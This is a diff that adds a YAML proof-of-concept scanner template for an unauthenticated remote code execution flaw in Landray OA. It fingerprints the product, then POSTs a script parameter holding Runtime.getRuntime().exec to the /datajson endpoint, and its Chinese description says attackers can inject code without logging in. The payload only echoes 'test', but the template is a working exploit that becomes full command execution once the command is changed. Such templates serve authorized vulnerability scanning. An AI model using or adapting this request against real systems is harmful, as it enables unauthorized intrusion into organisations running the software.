@@ -1,0 +1,24 @@
+name: poc-yaml-landray-oa-datajson-rce
+groups:
+  detect:
+    - method: GET
+      path: /datajson
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"landray") || response.body.bcontains(b"蓝凌"))
+  exploit:
+    - method: POST
+      path: /datajson
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: >-
+        s_bean=ruleFormulaValidate&script=Runtime.getRuntime().exec("echo test")
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"test") || response.body.bcontains(b"Process") || response.body.bcontains(b"result"))
+detail:
+  author: L4xy
+  description: "蓝凌OA存在未授权远程代码执行漏洞，攻击者可通过datajson接口注入恶意代码实现RCE，无需登录即可利用"
+  links:
+    - https://github.com/ExpLangcn/HVVExploitApply_POC
+  tags: rce,landray,oa
